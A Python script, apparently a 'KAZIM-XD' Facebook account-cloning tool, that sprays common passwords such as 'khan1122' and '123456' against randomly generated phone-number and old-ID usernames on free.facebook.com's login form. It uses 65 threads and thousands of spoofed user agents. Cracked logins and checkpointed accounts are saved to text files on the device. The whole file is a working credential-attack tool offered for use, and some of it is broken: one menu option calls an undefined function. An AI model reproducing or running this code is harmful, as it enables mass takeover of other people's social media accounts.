import os

import sys

import requests

import mechanize

import time

import json

import random

import re

import string

import platform

import base64

import uuid

from datetime import datetime

from concurrent.futures import ThreadPoolExecutor as speed

ugen = []

for ua in range(5000):

      a='Mozilla/5.0 (Linux; Android'

      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])

      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])

      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'

      d=random.randrange(40,115)

      e='0'

      f=random.randrange(3000,6000)

      g=random.randrange(20,100)

      h='Mobile Safari/537.36'

      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")

      ugen.append(ug)

for ua in range(5000):

    a='NokiaX'

    b=random.randrange(1,9)

    c='-0'

    d=random.randrange(1,9)

    e='/'

    f=random.randrange(1,9)

    g='.0 ('

    h=random.randrange(1,12)

    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'

    j='UNTRUSTED/'

    k=random.randrange(1,3)

    l='.0'

    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'

    ugen.append(uaku2)

user = []

loop = 0

okacc = []

cpacc = []

method = []

choice_pass = []

def clear():

    os.system('clear')

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

def logo():

    print(f"""\x1b[1;90m╔════════════════════════════════════════════╗

\x1b[1;90m║\x1b[1;91mdb   dD  .d8b.  d88888D d888888b .88b  d88. \x1b[1;90m║

\x1b[1;90m║\x1b[1;92m88 ,8P' d8' `8b YP  d8'   `88'   88'YbdP`88 \x1b[1;90m║

\x1b[1;90m║\x1b[1;92m88,8P   88ooo88    d8'     88    88  88  88 \x1b[1;90m║

\x1b[1;90m║\x1b[1;93m88`8b   88~~~88   d8'      88    88  88  88 \x1b[1;90m║

\x1b[1;90m║\x1b[1;93m88 `88. 88   88  d8' db   .88.   88  88  88 \x1b[1;90m║

\x1b[1;90m║\x1b[1;96mYP   YD YP   YP d88888P Y888888P YP  YP  YP \x1b[1;90m║

\x1b[1;90m╠════════════════════════════════════════════╣

\x1b[1;90m║\x1b[1;91mOwner    : \x1b[1;92mMuhammad Kazim Channa            \x1b[1;90m║

\x1b[1;90m╠════════════════════════════════════════════╣

\x1b[1;90m║\x1b[1;91mGithub   : \x1b[1;92mMuhammad Kazim Channa            \x1b[1;90m║

\x1b[1;90m╠════════════════════════════════════════════╣

\x1b[1;90m║\x1b[1;91mVersion  : \x1b[1;92m0.1                              \x1b[1;90m║

\x1b[1;90m╚════════════════════════════════════════════╝""")

def lines():

    print(50*'\x1b[1;96m═')

def kazim():

    clear()

    logo()

    CorrectUsername = "Muhammad Kazim"

    CorrectPassword = "Channa"

    username = input('\x1b[1;91m[√] Put Username : \x1b[1;92m')

    if username == CorrectUsername:

        password = input('\x1b[1;91m[√] Put Password : \x1b[1;92m')

        if password == CorrectPassword:

            main()

def main():

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91m[01] \x1b[1;92mRandom Old Ids Cloning                 \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[02] \x1b[1;92mRandom Number Cloning                  \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[03] \x1b[1;92mFollow Github Account                  \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[04] \x1b[1;92mFollow Facebook Account                \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[05] \x1b[1;92mExit Main Menu                         \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    opt = input(' \x1b[1;91m[?] Choose Option : \x1b[1;92m')

    if opt =='1':

        old()

    elif opt =='2':

        method()

    elif opt =='3':

        os.system('xdg-open https://github.com/Mr-Kazim')

    elif opt =='4':

        os.system('xdg-open https://www.facebook.com/profile.php?id=100093112187724')

    elif opt =='5':

        exit('Bye Bye...')

    else:

        main()

def old():

    clear()

    logo()

    x = '100000'

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m1000 , 2000 , 5000 , 10000        \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    limit = int(input('\x1b[1;91m[?] Put Limit : \x1b[1;92m'))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(9))

        user.append(nmp)

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;92mUse 123456 Password for Old Ids             \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    psw = input('\x1b[1;91m[?] Put Password : \x1b[1;92m')

    with speed(max_workers=65) as crack:

        clear()

        logo()

        total_ids = str(len(user))

        print('\x1b[1;90m╔════════════════════════════════════════════╗')

        print('\x1b[1;90m║\x1b[1;91m[√] Total Ids : \x1b[1;92m'+total_ids+'                        \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mWait and See reSults                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mSome OK Ids are locked                  \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mUse Flight Mode for Speed Up            \x1b[1;90m║')

        print('\x1b[1;90m╚════════════════════════════════════════════╝')

        for love in user:

            username = x+love

            password = [psw]

            crack.submit(oldfb,username,password,total_ids)

    exit()

def method():

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91m[01] \x1b[1;92mRandom Cloning Method 1                \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[02] \x1b[1;92mRandom Cloning Method 2                \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[03] \x1b[1;92mRandom Cloning Method 3                \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[04] \x1b[1;92mRandom Cloning Method 4                \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[05] \x1b[1;92mRandom Cloning Method 5                \x1b[1;90m║')

    print('\x1b[1;90m║\x1b[1;91m[06] \x1b[1;92mRandom Cloning Choice Password         \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    opt = input(' \x1b[1;91m[?] Choose Option : \x1b[1;92m')

    if opt =='1':

        method1()

    elif opt =='2':

        method2()

    elif opt =='3':

        method3()

    elif opt =='4':

        method4()

    elif opt =='5':

        method5()

    elif opt =='6':

        method6()

    else:

        method()

def method1():

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m0310 , 0320 , 0330 , 0340         \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    code = input('\x1b[1;91m[?] Put Code : \x1b[1;92m')

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m1000 , 2000 , 5000 , 10000        \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    limit = int(input('\x1b[1;91m[?] Put Limit : \x1b[1;92m'))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with speed(max_workers=65) as crack:

        clear()

        logo()

        total_ids = str(len(user))

        print('\x1b[1;90m╔════════════════════════════════════════════╗')

        print('\x1b[1;90m║\x1b[1;91m[√] Total Ids     : \x1b[1;92m'+total_ids+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] Selected Code : \x1b[1;92m'+code+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mWait and See reSults                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mSome OK Ids are locked                  \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mUse Flight Mode for Speed Up            \x1b[1;90m║')

        print('\x1b[1;90m╚════════════════════════════════════════════╝')

        for love in user:

            username = [code+love]

            password = [love]

            crack.submit(freefb,username,password,total_ids)

    exit()

def method2():

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m0310 , 0320 , 0330 , 0340         \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    code = input('\x1b[1;91m[?] Put Code : \x1b[1;92m')

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m1000 , 2000 , 5000 , 10000        \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    limit = int(input('\x1b[1;91m[?] Put Limit : \x1b[1;92m'))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with speed(max_workers=65) as crack:

        clear()

        logo()

        total_ids = str(len(user))

        print('\x1b[1;90m╔════════════════════════════════════════════╗')

        print('\x1b[1;90m║\x1b[1;91m[√] Total Ids     : \x1b[1;92m'+total_ids+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] Selected Code : \x1b[1;92m'+code+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mWait and See reSults                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mSome OK Ids are locked                  \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mUse Flight Mode for Speed Up            \x1b[1;90m║')

        print('\x1b[1;90m╚════════════════════════════════════════════╝')

        for love in user:

            username = [code+love]

            password = [love,code+love]

            crack.submit(freefb,username,password,total_ids)

    exit()

def method3():

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m0310 , 0320 , 0330 , 0340         \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    code = input('\x1b[1;91m[?] Put Code : \x1b[1;92m')

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m1000 , 2000 , 5000 , 10000        \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    limit = int(input('\x1b[1;91m[?] Put Limit : \x1b[1;92m'))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with speed(max_workers=65) as crack:

        clear()

        logo()

        total_ids = str(len(user))

        print('\x1b[1;90m╔════════════════════════════════════════════╗')

        print('\x1b[1;90m║\x1b[1;91m[√] Total Ids     : \x1b[1;92m'+total_ids+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] Selected Code : \x1b[1;92m'+code+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mWait and See reSults                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mSome OK Ids are locked                  \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mUse Flight Mode for Speed Up            \x1b[1;90m║')

        print('\x1b[1;90m╚════════════════════════════════════════════╝')

        for love in user:

            username = [code+love]

            password = [love,code+love,'khan1122']

            crack.submit(freefb,username,password,total_ids)

    exit()

def method4():

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m0310 , 0320 , 0330 , 0340         \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    code = input('\x1b[1;91m[?] Put Code : \x1b[1;92m')

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m1000 , 2000 , 5000 , 10000        \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    limit = int(input('\x1b[1;91m[?] Put Limit : \x1b[1;92m'))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with speed(max_workers=65) as crack:

        clear()

        logo()

        total_ids = str(len(user))

        print('\x1b[1;90m╔════════════════════════════════════════════╗')

        print('\x1b[1;90m║\x1b[1;91m[√] Total Ids     : \x1b[1;92m'+total_ids+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] Selected Code : \x1b[1;92m'+code+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mWait and See reSults                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mSome OK Ids are locked                  \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mUse Flight Mode for Speed Up            \x1b[1;90m║')

        print('\x1b[1;90m╚════════════════════════════════════════════╝')

        for love in user:

            username = [code+love]

            password = [love,code+love,'khan1122','khan123']

            crack.submit(freefb,username,password,total_ids)

    exit()

def method5():

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m0310 , 0320 , 0330 , 0340         \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    code = input('\x1b[1;91m[?] Put Code : \x1b[1;92m')

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m1000 , 2000 , 5000 , 10000        \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    limit = int(input('\x1b[1;91m[?] Put Limit : \x1b[1;92m'))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with speed(max_workers=65) as crack:

        clear()

        logo()

        total_ids = str(len(user))

        print('\x1b[1;90m╔════════════════════════════════════════════╗')

        print('\x1b[1;90m║\x1b[1;91m[√] Total Ids     : \x1b[1;92m'+total_ids+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] Selected Code : \x1b[1;92m'+code+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mWait and See reSults                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mSome OK Ids are locked                  \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mUse Flight Mode for Speed Up            \x1b[1;90m║')

        print('\x1b[1;90m╚════════════════════════════════════════════╝')

        for love in user:

            username = [code+love]

            password = [love,code+love,'khan1122','khan123','khan12345','pakistan','57273200']

            crack.submit(freefb,username,password,total_ids)

    exit()

def method6():

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m0310 , 0320 , 0330 , 0340         \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    code = input('\x1b[1;91m[?] Put Code : \x1b[1;92m')

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m1000 , 2000 , 5000 , 10000        \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    limit = int(input('\x1b[1;91m[?] Put Limit : \x1b[1;92m'))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92m1 , 2 , 3 , 4 , 5 , 6             \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    passx = int(input('\x1b[1;91m[√] Put Password Limit : \x1b[1;92m'))

    clear()

    logo()

    print('\x1b[1;90m╔════════════════════════════════════════════╗')

    print('\x1b[1;90m║\x1b[1;91mExample : \x1b[1;92mkhan123 , ali khan , khan12345    \x1b[1;90m║')

    print('\x1b[1;90m╚════════════════════════════════════════════╝')

    for x in range(passx):

        choice_ask = input(f'\x1b[1;91m[√] Put Password {x+1} : \x1b[1;92m')

        choice_pass.append(choice_ask)

    with speed(max_workers=65) as crack:

        clear()

        logo()

        total_ids = str(len(user))

        print('\x1b[1;90m╔════════════════════════════════════════════╗')

        print('\x1b[1;90m║\x1b[1;91m[√] Total Ids     : \x1b[1;92m'+total_ids+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] Selected Code : \x1b[1;92m'+code+'                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mWait and See reSults                    \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mSome OK Ids are locked                  \x1b[1;90m║')

        print('\x1b[1;90m║\x1b[1;91m[√] \x1b[1;92mUse Flight Mode for Speed Up            \x1b[1;90m║')

        print('\x1b[1;90m╚════════════════════════════════════════════╝')

        for love in user:

            username = code+love

            password = [love]

            for hate in choice_pass:

                password.append(hate)

            crack.submit(freefbfb,username,password,total_ids)

    exit()

def oldfb(username,password,total_ids):

    global loop

    global cpacc

    global okacc

    try:

        for pwx in password:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write(f'\r\x1b[1;97m[KAZIM-XD] [%s/%s] [OK-%s] [CP-%s]\r'%(loop,total_ids,len(cpacc),len(okacc))),

            sys.stdout.flush()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":username,

            "pass":pwx,

            "login":"Log In"}

            header_freefb = {'authority': 'free.facebook.com',

            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',

            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',

            'sec-ch-ua-mobile': '?1',

            'sec-ch-ua-platform': '"Android"',

            'sec-fetch-dest': 'document',

            'sec-fetch-mode': 'navigate',

            'sec-fetch-site': 'none',

            'sec-fetch-user': '?1',

            'upgrade-insecure-requests': '1',

            'user-agent': pro,}

            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[65:80]

                print('\x1b[1;91m[KAZIM-OLD-CP] '+username+' | '+pwx)

                open('/sdcard/KAZIM-OLD-CP.txt', 'a').write(username+' | '+pwx+'\n')

                okacc.append(username)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

                print('\x1b[1;92m[KAZIM-OK] '+username+' | '+pwx)

                open('/sdcard/KAZIM-OLD-OK.txt', 'a').write(username+' | '+pwx+'\n')

                cpacc.append(username)

                break

            else:

                continue

        loop+=1

    except:

        pass

def freefb(username,password,total_ids):

    global loop

    global cpacc

    global okacc

    try:

        for pwx in password:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write(f'\r\x1b[1;97m[KAZIM-XD] [%s/%s] [OK-%s] [CP-%s]\r'%(loop,total_ids,len(okacc),len(cpacc))),

            sys.stdout.flush()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":username,

            "pass":pwx,

            "login":"Log In"}

            header_freefb = {'authority': 'free.facebook.com',

            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',

            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',

            'sec-ch-ua-mobile': '?1',

            'sec-ch-ua-platform': '"Android"',

            'sec-fetch-dest': 'document',

            'sec-fetch-mode': 'navigate',

            'sec-fetch-site': 'none',

            'sec-fetch-user': '?1',

            'upgrade-insecure-requests': '1',

            'user-agent': pro,}

            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[65:80]

                print('\x1b[1;92m[KAZIM-OK] '+username+' | '+pwx)

                open('/sdcard/KAZIM-OK.txt', 'a').write(username+' | '+pwx+'\n')

                okacc.append(username)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

                print('\x1b[1;91m[KAZIM-CP] '+username+' | '+pwx)

                open('/sdcard/KAZIM-CP.txt', 'a').write(username+' | '+pwx+'\n')

                cpacc.append(username)

                break

            else:

                continue

        loop+=1

    except:

        pass

kazim()
